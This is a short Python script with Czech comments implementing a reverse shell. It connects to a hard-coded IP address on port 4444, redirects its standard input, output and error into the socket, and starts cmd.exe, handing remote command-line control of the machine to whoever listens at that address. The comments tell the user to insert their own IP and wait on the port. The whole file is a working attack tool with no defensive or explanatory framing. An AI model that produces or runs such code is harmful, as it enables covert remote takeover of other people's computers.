import socket
import subprocess
import os

# Tvůj počítač IP a port
IP = "192.168.0.101"   # << sem napiš svoji IP adresu
PORT = 4444            # port, kde budeš čekat

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))

# Přesměruj stdin, stdout a stderr do socketu
os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr

# Spustí příkazovou řádku
subprocess.call(["cmd.exe"])
